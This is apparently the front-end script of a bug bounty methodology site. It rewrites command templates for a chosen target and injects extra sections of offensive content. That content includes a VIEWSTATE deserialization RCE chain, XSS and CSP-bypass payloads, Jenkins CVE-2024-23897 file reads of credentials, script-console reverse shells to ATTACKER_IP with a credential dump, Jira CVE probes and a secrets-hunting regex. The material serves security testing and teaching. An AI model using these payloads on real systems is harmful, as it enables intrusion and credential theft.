'use strict';
/* ===== RV_U Methodology - Smart Command & Workspace Generator ===== */

// ==================== Utilities ====================
function escapeHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function escapeRegex(s) { return s.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'); }

// ==================== Active Target & Dynamic Commands ====================
let activeTarget = null;        // { value, type }
const originalCodeContents = new Map(); // stores original textContent per <code> element

function storeOriginalCode() {
  document.querySelectorAll('pre code').forEach(code => {
    if (!originalCodeContents.has(code)) {
      originalCodeContents.set(code, code.textContent);
    }
  });
}

function applyTargetToCommands(targetValue, targetType) {
  const isBulk = (targetType === 'wildcard');
  // Tools whose flags should be transformed in wildcard/list mode
  const transformTools = ['subfinder','amass','nuclei','assetfinder','ffuf','httpx','subjack','subzy','dnscan','dirsearch','gau','waymore'];
  // System utilities whose flags must NEVER be touched
  const excludedTools = ['sort','uniq','grep','sed','awk','cat','jq','prips','dig','masscan',
    'tee','head','tail','wc','tr','cut','xargs','echo','curl','wget'];

  originalCodeContents.forEach((original, codeEl) => {
    let text = original;

    if (isBulk) {
      // Bug 1 fix: In URLs (after :// or //) replace domain with FUZZ; standalone refs get targetValue filename
      text = text.replace(/(?<=:\/\/|\/\/)(?:example|site|Target)\.com/gi, 'FUZZ');
      text = text.replace(/\b(?:example|site|Target)\.com\b/gi, targetValue);

      // Handle special subfinder pipe pattern first (line-level)
      text = text.replace(/echo\s+["']?[^"'\n|]+["']?\s*\|\s*subfinder\b/g, 'subfinder -dL ' + targetValue);

      // Process line by line for context-aware flag transformation
      text = text.split('\n').map(line => {
        // Detect the primary tool in each line/pipe segment
        const segments = line.split('|');
        return segments.map(seg => {
          const trimmed = seg.trim();

          // Check if this segment starts with an excluded tool
          const segTool = trimmed.split(/\s+/)[0];
          if (excludedTools.some(ex => segTool === ex || segTool.endsWith('/' + ex))) {
            return seg; // Do not touch excluded tools at all
          }

          // Only transform flags if the segment uses a known transformable tool
          const toolPattern = new RegExp('\\b(' + transformTools.join('|') + ')\\b');
          const usesTransformTool = toolPattern.test(trimmed);

          if (usesTransformTool) {
            const isFfuf = /\bffuf\b/.test(trimmed);
            const isAmass = /\bamass\b/.test(trimmed);

            // Bug 3 fix: amass uses -df for file input, other tools use -dL
            if (isAmass) {
              seg = seg.replace(/(^|\s)-d(?=\s|$)/gm, '$1-df');
            } else {
              seg = seg.replace(/(^|\s)-d(?=\s|$)/gm, '$1-dL');
            }

            // Bug 2 fix: ffuf keeps -u and receives -w wordlist; other tools change -u to -l
            if (isFfuf) {
              if (!/(^|\s)-w(?=\s|$)/.test(seg)) {
                seg = seg.trimEnd() + ' -w ' + targetValue;
              }
            } else {
              seg = seg.replace(/(^|\s)-u(?=\s|$)/gm, '$1-l');
            }

            seg = seg.replace(/(^|\s)-i(?=\s|$)/gm, '$1-I');
          }

          return seg;
        }).join('|');
      }).join('\n');
    } else {
      // Domain mode: replace all placeholders with targetValue
      text = text.replace(/(?:example|site|Target)\.com/gi, targetValue);
    }

    codeEl.textContent = text;
  });
}

function setActiveTarget(value, type) {
  activeTarget = { value, type };
  try { localStorage.setItem('rvu_active_target', JSON.stringify(activeTarget)); } catch(e) {}
  applyTargetToCommands(value, type);
  showToast('🎯 Active target: ' + value);
}

function clearActiveTarget() {
  activeTarget = null;
  try { localStorage.removeItem('rvu_active_target'); } catch(e) {}
  // Restore original code
  originalCodeContents.forEach((original, codeEl) => {
    codeEl.textContent = original;
  });
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 3000);
}

// ==================== Single Section View ====================
let activeSectionId = null;

function showSection(id) {
  const el = document.getElementById(id);
  if (!el) return;

  activeSectionId = id;
  try { localStorage.setItem('rvu_active_section', id); } catch(e) {}

  // Hide all sections, show only the selected one
  document.querySelectorAll('.methodology-section').forEach(sec => {
    sec.style.display = (sec.id === id) ? '' : 'none';
  });

  // Ensure section body is expanded
  const body = el.querySelector('.section-body');
  const hdr  = el.querySelector('.section-header');
  if (body && body.classList.contains('collapsed')) {
    body.classList.remove('collapsed');
    if (hdr) hdr.classList.remove('collapsed');
  }

  // Update active sidebar link
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
  const link = document.querySelector(`.nav-link[data-target="${CSS.escape(id)}"]`);
  if (link) link.classList.add('active');

  // Scroll to top of content area
  el.scrollIntoView({ behavior: 'smooth', block: 'start' });

  // Close mobile sidebar if open
  if (window.innerWidth <= 768) {
    document.getElementById('sidebar').classList.remove('mobile-open');
    document.getElementById('sidebar-overlay').classList.remove('visible');
  }
}

function showAllSections() {
  document.querySelectorAll('.methodology-section').forEach(sec => {
    sec.style.display = '';
  });
  activeSectionId = null;
  try { localStorage.removeItem('rvu_active_section'); } catch(e) {}
}

// ==================== Domain / Target Input System ====================
const targetInput   = document.getElementById('target-input');
const targetTypeSel = document.getElementById('target-type-select');
const targetTagsCont= document.getElementById('target-tags');

function applyFromInput() {
  const value = targetInput.value.trim();
  const type  = targetTypeSel.value;
  if (!value) {
    clearActiveTarget();
    return;
  }
  setActiveTarget(value, type);
}

// Listen for input changes on target-input (smart variable injection)
targetInput.addEventListener('input', () => {
  applyFromInput();
});

// Listen for type change
targetTypeSel.addEventListener('change', () => {
  applyFromInput();
  try { localStorage.setItem('rvu_target_type', targetTypeSel.value); } catch(e) {}
});

document.getElementById('add-target-btn').addEventListener('click', () => {
  applyFromInput();
});
targetInput.addEventListener('keydown', e => {
  if (e.key === 'Enter') { applyFromInput(); }
});

document.getElementById('clear-targets-btn').addEventListener('click', () => {
  targetInput.value = '';
  clearActiveTarget();
  try {
    localStorage.removeItem('rvu_active_target');
    localStorage.removeItem('rvu_target_value');
  } catch(e) {}
  showToast('🗑️ Target cleared!');
});

document.getElementById('start-methodology').addEventListener('click', () => {
  const type = targetTypeSel.value;
  showSection(type === 'wildcard' ? 'sec-1' : 'sec-3');
  showToast('🚀 Methodology started! Happy hunting!');
});

// ==================== Sidebar Navigation ====================
const sidebar      = document.getElementById('sidebar');
const mainContent  = document.getElementById('main-content');
const overlay      = document.getElementById('sidebar-overlay');
let sidebarOpen = true;

document.getElementById('sidebar-toggle').addEventListener('click', () => {
  if (window.innerWidth <= 768) {
    sidebar.classList.toggle('mobile-open');
    overlay.classList.toggle('visible');
  } else {
    sidebarOpen = !sidebarOpen;
    sidebar.classList.toggle('collapsed', !sidebarOpen);
    mainContent.classList.toggle('expanded', !sidebarOpen);
  }
});

overlay.addEventListener('click', () => {
  sidebar.classList.remove('mobile-open');
  overlay.classList.remove('visible');
});

// Sidebar nav-link click => Single Section View
document.querySelectorAll('.nav-link[data-target]').forEach(link => {
  link.addEventListener('click', () => showSection(link.dataset.target));
});

// ==================== Section Collapse/Expand ====================
document.querySelectorAll('.section-header').forEach(hdr => {
  hdr.addEventListener('click', e => {
    if (e.target.classList.contains('section-complete-btn')) return;
    const body = hdr.nextElementSibling;
    if (body && body.classList.contains('section-body')) {
      body.classList.toggle('collapsed');
      hdr.classList.toggle('collapsed');
    }
  });
});

function saveCompleted() {
  const ids = [];
  document.querySelectorAll('.section-complete-btn.done').forEach(btn => {
    const sec = btn.closest('.methodology-section');
    if (sec) ids.push(sec.id);
  });
  try { localStorage.setItem('rvu_completed', JSON.stringify(ids)); } catch(e) {}
}

document.querySelectorAll('.section-complete-btn').forEach(btn => {
  btn.addEventListener('click', e => {
    e.stopPropagation();
    btn.classList.toggle('done');
    btn.textContent = btn.classList.contains('done') ? '✓ Done' : 'Mark Done';
    const sec = btn.closest('.methodology-section');
    const navLink = document.querySelector(`.nav-link[data-target="${CSS.escape(sec.id)}"]`);
    if (navLink) navLink.classList.toggle('completed', btn.classList.contains('done'));
    updateProgress();
    saveCompleted();
    showToast('💾 Progress saved!');
  });
});

function updateProgress() {
  const total = document.querySelectorAll('.section-complete-btn').length;
  const done  = document.querySelectorAll('.section-complete-btn.done').length;
  const pct   = total ? Math.round((done / total) * 100) : 0;
  document.getElementById('progress-fill').style.width = pct + '%';
  const lbl = document.getElementById('progress-label-text');
  if (lbl) lbl.textContent = `${done}/${total} sections completed (${pct}%)`;
}

// ==================== Copy Buttons ====================
function initCopyButtons() {
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.innerHTML = '📋 Copy';
    btn.addEventListener('click', () => {
      const pre = btn.closest('.code-block-wrapper')?.querySelector('pre');
      if (!pre) return;
      const text = pre.innerText || pre.textContent;
      const done = () => {
        btn.textContent = '✓ Copied!';
        btn.classList.add('copied');
        setTimeout(() => { btn.innerHTML = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
      };
      if (navigator.clipboard) {
        navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
      } else { fallbackCopy(text, done); }
    });
  });
}
function fallbackCopy(text, cb) {
  const ta = document.createElement('textarea');
  ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
  document.body.appendChild(ta); ta.select();
  try { document.execCommand('copy'); } catch(e) {}
  document.body.removeChild(ta); cb();
}

// ==================== Sidebar Search (with Single View integration) ====================
const sidebarSearch = document.getElementById('sidebar-search');
const searchCount   = document.getElementById('search-results-count');
let searchTimeout;

function performSearch(query) {
  // Clear previous highlights
  document.querySelectorAll('.search-highlight').forEach(el => {
    el.replaceWith(document.createTextNode(el.textContent));
  });
  document.getElementById('content').normalize();
  if (!query || query.length < 2) { if (searchCount) searchCount.textContent = ''; return; }

  // Temporarily show all sections so we can search them
  document.querySelectorAll('.methodology-section').forEach(sec => {
    sec.style.display = '';
  });

  const regex = new RegExp(escapeRegex(query), 'gi');
  let count = 0; let firstMatch = null;

  walkTextNodes(document.getElementById('content'), node => {
    if (!regex.test(node.textContent)) return;
    regex.lastIndex = 0;
    const par = node.parentNode;
    if (!par || ['SCRIPT','STYLE','BUTTON'].includes(par.tagName)) return;
    const parts = node.textContent.split(new RegExp(`(${escapeRegex(query)})`, 'gi'));
    const frag  = document.createDocumentFragment();
    parts.forEach(part => {
      if (part.toLowerCase() === query.toLowerCase()) {
        const mark = document.createElement('mark');
        mark.className = 'search-highlight'; mark.textContent = part;
        frag.appendChild(mark); count++;
        if (!firstMatch) firstMatch = mark;
      } else { frag.appendChild(document.createTextNode(part)); }
    });
    par.replaceChild(frag, node);
  });

  if (searchCount) searchCount.textContent = count ? `${count} match${count > 1 ? 'es' : ''}` : 'No matches';

  // If matches found, show the section of the first match (Single View integration)
  if (firstMatch) {
    const sec = firstMatch.closest('.methodology-section');
    if (sec) {
      showSection(sec.id);
      // Expand collapsed body
      const body = sec.querySelector('.section-body');
      const hdr  = sec.querySelector('.section-header');
      if (body && body.classList.contains('collapsed')) {
        body.classList.remove('collapsed');
        if (hdr) hdr.classList.remove('collapsed');
      }
    }
    firstMatch.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }

  // Expand any collapsed section bodies that contain matches
  document.querySelectorAll('.search-highlight').forEach(m => {
    const sec = m.closest('.methodology-section');
    if (!sec) return;
    const body = sec.querySelector('.section-body');
    const hdr  = sec.querySelector('.section-header');
    if (body && body.classList.contains('collapsed')) {
      body.classList.remove('collapsed');
      if (hdr) hdr.classList.remove('collapsed');
    }
  });
}

function walkTextNodes(node, cb) {
  if (node.nodeType === Node.TEXT_NODE) { cb(node); return; }
  if (['SCRIPT','STYLE'].includes(node.nodeName)) return;
  Array.from(node.childNodes).forEach(child => walkTextNodes(child, cb));
}

if (sidebarSearch) {
  sidebarSearch.addEventListener('input', () => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => performSearch(sidebarSearch.value.trim()), 300);
  });
}
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
    e.preventDefault();
    if (sidebarSearch) { sidebarSearch.focus(); sidebarSearch.select(); }
  }
});

// ==================== Scroll Events ====================
window.addEventListener('scroll', () => {
  const btt = document.getElementById('back-to-top');
  btt.classList.toggle('visible', window.scrollY > 400);
}, { passive: true });

document.getElementById('back-to-top').addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));

// ==================== Checklist ====================
function saveCheckboxes() {
  const state = {};
  document.querySelectorAll('.checklist input[type="checkbox"]').forEach((cb, i) => {
    state[i] = cb.checked;
  });
  try { localStorage.setItem('rvu_checkboxes', JSON.stringify(state)); } catch(e) {}
}

document.querySelectorAll('.checklist input[type="checkbox"]').forEach(cb => {
  cb.addEventListener('change', () => {
    const li = cb.closest('li');
    if (li) li.classList.toggle('checked', cb.checked);
    saveCheckboxes();
  });
});

// ==================== UI Cleanup (dynamic) ====================
function cleanupUI() {
  // 1. Remove topbar global search input and its result count
  const globalSearch = document.getElementById('global-search');
  if (globalSearch) globalSearch.remove();
  const searchResultsCount = document.getElementById('search-results-count');
  if (searchResultsCount) searchResultsCount.remove();

  // 2. Remove the topbar hint
  const topbarHint = document.querySelector('.topbar-hint');
  if (topbarHint) topbarHint.remove();

  // 3. Remove file upload label and input
  const fileUploadLabel = document.getElementById('file-upload-label');
  if (fileUploadLabel) fileUploadLabel.remove();
  const fileUpload = document.getElementById('file-upload');
  if (fileUpload) fileUpload.remove();

  // 4. Simplify target-type-select to only Domain and Wildcard
  const sel = document.getElementById('target-type-select');
  if (sel) {
    sel.innerHTML = '';
    const optDomain = document.createElement('option');
    optDomain.value = 'domain';
    optDomain.textContent = '🏠 Domain';
    const optWildcard = document.createElement('option');
    optWildcard.value = 'wildcard';
    optWildcard.textContent = '🌐 Wildcard';
    sel.appendChild(optDomain);
    sel.appendChild(optWildcard);
  }

  // 5. Branding: Replace "r-v313" with "Ramez Medhat" in the footer
  const footer = document.querySelector('footer');
  if (footer) {
    footer.textContent = '';
    const span = document.createElement('span');
    span.textContent = 'Ramez Medhat';
    footer.appendChild(document.createTextNode('RV_U Methodology \u2014 Created by '));
    footer.appendChild(span);
    footer.appendChild(document.createTextNode(' | 64 Sections of Professional Bug Bounty Techniques | Happy Hunting! \uD83C\uDFAF'));
  }
}

// ==================== Content Injection Helpers ====================
function createSubsection(title) {
  const div = document.createElement('div');
  div.className = 'subsection';
  const h = document.createElement('div');
  h.className = 'subsection-title';
  h.textContent = title;
  div.appendChild(h);
  return div;
}
function createCodeBlock(lang, code) {
  const wrapper = document.createElement('div');
  wrapper.className = 'code-block-wrapper';
  const header = document.createElement('div');
  header.className = 'code-header';
  const langSpan = document.createElement('span');
  langSpan.className = 'code-lang';
  langSpan.textContent = lang;
  const copyBtn = document.createElement('button');
  copyBtn.className = 'copy-btn';
  header.appendChild(langSpan);
  header.appendChild(copyBtn);
  const pre = document.createElement('pre');
  const codeEl = document.createElement('code');
  codeEl.textContent = code;
  pre.appendChild(codeEl);
  wrapper.appendChild(header);
  wrapper.appendChild(pre);
  return wrapper;
}

// ==================== Aggressive Tool Optimization (Task 4) ====================
function upgradeToolCommands() {
  document.querySelectorAll('pre code').forEach(codeEl => {
    let t = codeEl.textContent;
    // Subfinder: upgrade basic pipe usage to aggressive mode
    t = t.replace(
      /echo\s+["']?site\.com["']?\s*\|\s*subfinder/g,
      'subfinder -d example.com -all -recursive -silent -o subs.txt'
    );
    // Amass enum: add -active -brute if not already present (line-by-line)
    t = t.split('\n').map(function(line) {
      if (/amass\s+enum\b/.test(line)) {
        if (!/\s-active\b/.test(line)) {
          line = line.replace(/amass\s+enum/, 'amass enum -active');
        }
        if (!/\s-brute\b/.test(line)) {
          line = line.replace(/amass\s+enum(?:\s+-active)?/, '$& -brute');
        }
      }
      // Amass intel: add -active if not present
      if (/amass\s+intel\b/.test(line) && !/\s-active\b/.test(line)) {
        line = line.replace(/amass\s+intel/, 'amass intel -active');
      }
      return line;
    }).join('\n');
    codeEl.textContent = t;
  });
}

// ==================== Content Migration (Task 5) ====================
function injectMigratedContent() {
  // --- Sec 06 (Burp): Add massive keys/tokens regex ---
  const sec6 = document.getElementById('sec-6');
  if (sec6) {
    const body = sec6.querySelector('.section-body');
    if (body) {
      const sub = createSubsection('Extended Secrets & Tokens Detection Regex');
      sub.appendChild(createCodeBlock('regex',
        '(?i)(' +
        'access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|' +
        'alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|' +
        'aos_key|api_key|api_key_secret|api_key_sid|api_secret|apidocs|apikey|apiSecret|' +
        'app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|' +
        'application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|' +
        'aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|' +
        'aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|' +
        'bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|' +
        'bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|' +
        'built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|' +
        'cattle_secret_key|certificate_password|ci_deploy_password|client_secret|' +
        'client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|' +
        'cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|' +
        'cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|' +
        'consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|' +
        'datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|' +
        'dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|' +
        'docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|' +
        'dockerhub_password|dockerhubpassword|dot-hierarchical-password|dotfiles_hierarchical_password|' +
        'droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|' +
        'elasticsearch_password|encryption_key|encryption_password|env.hierarchical_password|' +
        'env.ICLOUD_CONTAINER|eureka.hierarchical_password|facebook_secret|firebase_api_token|' +
        'firebase_key|firebase_token|fossa_api_key|ftp_password|gh_token|ghost_api_key|' +
        'github_api_key|github_deploy_hb_doc_pass|github_key|github_token|gitlab_user_email|' +
        'google_api|google_cloud|google_maps_api_key|google_private_key|gpg_key_name|' +
        'gpg_keyname|gpg_passphrase|gradle_signing_key_id|gradle_signing_password|' +
        'heroku_api_key|heroku_api_user|heroku_email|heroku_token|' +
        'HOMEBREW_GITHUB_API_TOKEN|hub_dxia2_password|jwt_secret|jwt_token|' +
        'ldap_password|ldap_username|linux_signing_key|mailchimp_api_key|mailchimp_key|' +
        'mailgun_api_key|mailgun_key|mailgun_secret_api_key|master_key|' +
        'mysql_password|mysql_root_password|nexus_password|node_env|npm_api_key|' +
        'npm_secret_key|npm_token|nuget_api_key|oauth_token|' +
        'okta_client_token|openwhisk_key|org_gradle_project_signing_key|' +
        'org_project_gradle_sonatype_nexus_password|os_password|ossrh_jira_password|' +
        'ossrh_pass|pagerduty_apikey|papertrail_api_token|parse_js_key|' +
        'paypal_secret|personal_key|plotly_apikey|postgresql_pass|' +
        'private_key|private_signing_password|prod.access_key_id|prod.exs|prod.secret_key_base|' +
        'pypi_passowrd|quip_token|rabbit_password|rds_password|redis_password|' +
        'registry_secure|rest_api_key|s3_access_key|s3_bucket|s3_endpoint|s3_key|' +
        's3_secret_access_key|salesforce_bulk_test_password|' +
        'secret_access_key|secret_key|secret_key_base|secretaccesskey|secretkey|' +
        'sentry_auth_token|sentry_default_org|sentry_key|setdstaccesskey|' +
        'sf_username|signing_key|signing_key_password|slack_api|slack_channel|slack_key|' +
        'slack_outgoing_token|slack_signing_secret|slack_token|slack_url|slack_webhook|' +
        'slack_webhook_url|smokecustomersecret|smtp_password|sonar_organization_key|' +
        'sonar_project_key|sonar_token|sonarcloud_api_token|sonatype_password|' +
        'soundcloud_client_secret|sshkey|stripe_key|stripe_secret|surge_login|surge_token|' +
        'svn_pass|tester_keys_password|token|travis_branch|travis_token|twilio_account_id|' +
        'twilio_account_secret|twilio_account_sid|twilio_api|twilio_api_key|' +
        'twilio_api_secret|twilio_token|twine_password|vault_password|' +
        'webhook_url|wordpress_password|zen_api_token|zendesk_api_token' +
        ')\\s*[=:]\\s*[\'"]?[a-zA-Z0-9_\\-\\.+\\/]{8,}[\'"]?'
      ));
      body.appendChild(sub);
    }
  }

  // --- Sec 11 (IIS): Add web.config/machinekey RCE flow ---
  const sec11 = document.getElementById('sec-11');
  if (sec11) {
    const body = sec11.querySelector('.section-body');
    if (body) {
      const sub = createSubsection('MachineKey Extraction & VIEWSTATE RCE Flow');
      sub.appendChild(createCodeBlock('bash',
        '# Step 1: Extract web.config via path traversal or LFI\n' +
        'curl https://example.com/..;/web.config\n' +
        'curl "https://example.com/download?file=../web.config"\n\n' +
        '# Step 2: Extract machineKey from web.config\n' +
        '# Look for: <machineKey validationKey="..." decryptionKey="..." />\n\n' +
        '# Step 3: Generate malicious VIEWSTATE with ysoserial.net\n' +
        'ysoserial.exe -p ViewState -g TextFormattingRunProperties \\\n' +
        '  -c "powershell -e JABjAGwAaQBlAG4AdAA..." \\\n' +
        '  --path="/vulnerable.aspx" --apppath="/" \\\n' +
        '  --decryptionalg="AES" --decryptionkey="DECRYPTION_KEY_HERE" \\\n' +
        '  --validationalg="SHA1" --validationkey="VALIDATION_KEY_HERE"\n\n' +
        '# Step 4: Send the payload\n' +
        'curl -X POST "https://example.com/vulnerable.aspx" \\\n' +
        '  --data-urlencode "__VIEWSTATE=GENERATED_PAYLOAD"\n\n' +
        '# Alternative: Use Blacklist3r to decrypt existing VIEWSTATE\n' +
        '# https://github.com/NotSoSecure/Blacklist3r\n' +
        'AspDotNetWrapper.exe --keypath MachineKeys.txt \\\n' +
        '  --encrypteddata "VIEWSTATE_VALUE" --purpose=viewstate \\\n' +
        '  --modifier=CA0B0334 --macdecode'
      ));
      body.appendChild(sub);
    }
  }

  // --- Sec 14 (XSS/CSP): Add Cloudflare bypass vectors and Polyglot PDF CSP bypass ---
  const sec14 = document.getElementById('sec-14');
  if (sec14) {
    const body = sec14.querySelector('.section-body');
    if (body) {
      const sub1 = createSubsection('Cloudflare XSS Bypass Vectors');
      sub1.appendChild(createCodeBlock('html',
        '<svg onload=alert(1)//\n' +
        '<svg/onload=&#97&#108&#101&#114&#116(1)>\n' +
        '<a"/onclick=(confirm)()>click\n' +
        '<svg/onload=self[`aler`%2b`t`](1)>\n' +
        '<svg::::onload=alert(1)>\n' +
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)//">\n' +
        '<input onfocus=alert(1) autofocus>\n' +
        '<select onfocus=alert(1) autofocus>\n' +
        '<textarea onfocus=alert(1) autofocus>\n' +
        '<video><source onerror=alert(1)>\n' +
        '<marquee onstart=alert(1)>\n' +
        '<details open ontoggle=alert(1)>\n' +
        '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>\n' +
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
      ));
      body.appendChild(sub1);

      const sub2 = createSubsection('Polyglot PDF & CSP Bypass');
      sub2.appendChild(createCodeBlock('text',
        '# Polyglot PDF XSS (valid PDF + embedded JS)\n' +
        '# Upload as .pdf, served with application/pdf MIME\n' +
        '# Bypasses CSP when PDF viewer executes embedded JS\n\n' +
        '%PDF-1.4\n' +
        '1 0 obj<</Pages 2 0 R>>endobj\n' +
        '2 0 obj<</Kids[3 0 R]/Count 1>>endobj\n' +
        '3 0 obj<</AA<</O<</JS(app.alert(1))/S/JavaScript>>>>/Parent 2 0 R>>endobj\n' +
        'trailer<</Root 1 0 R>>\n\n' +
        '# CSP Bypass via base-uri\n' +
        '<base href="https://attacker.com/">\n' +
        '# Then relative script paths load from attacker domain\n\n' +
        '# CSP Bypass via meta refresh\n' +
        '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">\n\n' +
        '# CSP Bypass via JSONP endpoints on whitelisted domains\n' +
        '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>\n' +
        '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>\n' +
        '<div ng-app ng-csp>{{$eval.constructor(\'alert(1)\')()}}</div>\n\n' +
        '# CSP Bypass via object-src\n' +
        '<object data="data:text/html,<script>alert(1)</script>">\n\n' +
        '# CSP Bypass via trusted types & DOM clobbering\n' +
        '<form><math><mtext></form><form><mglyph><style></math>' +
        '<img src onerror=alert(1)>'
      ));
      body.appendChild(sub2);
    }
  }

  // --- Sec 36 (Jenkins/Jira): Add CVE-2024-23897 details and RCE via script console ---
  const sec36 = document.getElementById('sec-36');
  if (sec36) {
    const body = sec36.querySelector('.section-body');
    if (body) {
      const sub1 = createSubsection('Jenkins CVE-2024-23897 — Arbitrary File Read via CLI');
      sub1.appendChild(createCodeBlock('bash',
        '# CVE-2024-23897 - Jenkins CLI arbitrary file read\n' +
        '# Affects Jenkins <= 2.441 and LTS <= 2.426.2\n' +
        '# The CLI uses args4j which expands @filename to file contents\n\n' +
        '# Download jenkins-cli.jar from target\n' +
        'wget http://jenkins.example.com:8080/jnlpJars/jenkins-cli.jar\n\n' +
        '# Read /etc/passwd (classic check)\n' +
        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ help "@/etc/passwd"\n\n' +
        '# Read credentials.xml for stored secrets\n' +
        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ help "@/var/jenkins_home/credentials.xml"\n\n' +
        '# Read master.key and hudson.util.Secret for decryption\n' +
        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ connect-node "@/var/jenkins_home/secrets/master.key"\n\n' +
        '# Alternative: use who-am-i for 1-line output\n' +
        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ who-am-i "@/etc/hostname"\n\n' +
        '# Automated scanner:\n' +
        '# https://github.com/h4x0r-dz/CVE-2024-23897\n' +
        'python3 CVE-2024-23897.py -u http://jenkins.example.com:8080/'
      ));
      body.appendChild(sub1);

      const sub2 = createSubsection('Jenkins Script Console RCE');
      sub2.appendChild(createCodeBlock('groovy',
        '// Jenkins Script Console — /script endpoint\n' +
        '// Requires admin or script permissions\n\n' +
        '// Command execution\n' +
        'println "id".execute().text\n' +
        'println "whoami".execute().text\n' +
        'println "cat /etc/passwd".execute().text\n\n' +
        '// Reverse shell (Bash)\n' +
        'def cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"\n' +
        '["bash", "-c", cmd].execute()\n\n' +
        '// Reverse shell (Python)\n' +
        'def cmd2 = \'python3 -c "import socket,subprocess,os;' +
        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' +
        's.connect((\\\'ATTACKER_IP\\\',4444));' +
        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);' +
        'subprocess.call([\\\'/bin/bash\\\',\\\'-i\\\'])"\'\n' +
        '["bash", "-c", cmd2].execute()\n\n' +
        '// Read file\n' +
        'new File("/etc/passwd").text\n\n' +
        '// List environment variables\n' +
        'System.getenv().each { k, v -> println "${k}=${v}" }\n\n' +
        '// Dump all credentials\n' +
        'com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(\n' +
        '  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,\n' +
        '  jenkins.model.Jenkins.instance, null, null\n' +
        ').each { println "id: ${it.id}, user: ${it.username}, pass: ${it.password}" }'
      ));
      body.appendChild(sub2);

      const sub3 = createSubsection('Jira Advanced Exploitation');
      sub3.appendChild(createCodeBlock('bash',
        '# CVE-2019-8451 - SSRF via gadgets/makeRequest\n' +
        'curl "https://jira.example.com/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/"\n\n' +
        '# CVE-2020-14179 - Information Disclosure\n' +
        'curl "https://jira.example.com/secure/QueryComponent!Default.jspa"\n\n' +
        '# CVE-2020-14181 - User Enumeration\n' +
        'curl "https://jira.example.com/secure/ViewUserHover.jspa?username=admin"\n\n' +
        '# CVE-2022-0540 - Authentication Bypass (Seraph)\n' +
        'curl "https://jira.example.com/InsightPluginShowGeneralConfiguration.jspa;"\n\n' +
        '# Unauthenticated dashboard access\n' +
        'curl "https://jira.example.com/rest/api/2/dashboard?maxResults=100"\n\n' +
        '# Project & user enumeration\n' +
        'curl "https://jira.example.com/rest/api/2/project"\n' +
        'curl "https://jira.example.com/rest/api/2/user/picker?query=a"\n' +
        'curl "https://jira.example.com/rest/api/2/groupuserpicker?query=admin&maxResults=50"\n\n' +
        '# Jira-Lens automated scanning\n' +
        'python3 jira-lens.py -u https://jira.example.com'
      ));
      body.appendChild(sub3);
    }
  }

  // --- Sec 36 (Technology-Specific): Add AEM, wpscan, Drupal, Firebase, Tomcat ---
  const sec36tech = document.getElementById('sec-36');
  if (sec36tech) {
    const body = sec36tech.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subAem = createSubsection('Adobe Experience Manager (AEM)');
      subAem.appendChild(createCodeBlock('bash',
        '# AEM fingerprinting and exploitation\n' +
        'python aem_hacker.py -u <URL> --host <Your_IP>\n\n' +
        '# AEM dispatcher bypass (access restricted paths)\n' +
        "curl 'https://TARGET/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1'\n\n" +
        '# Useful AEM endpoints\n' +
        'GET /system/console/bundles\n' +
        'GET /crx/de/index.jsp\n' +
        'GET /etc/packages.json\n' +
        'GET /.json\n' +
        'GET /content.infinity.json\n' +
        'GET /libs/granite/core/content/login.html\n\n' +
        '# AEM user enumeration\n' +
        'GET /bin/querybuilder.json?type=rep:User&p.limit=-1&p.hits=full'
      ));
      frag.appendChild(subAem);

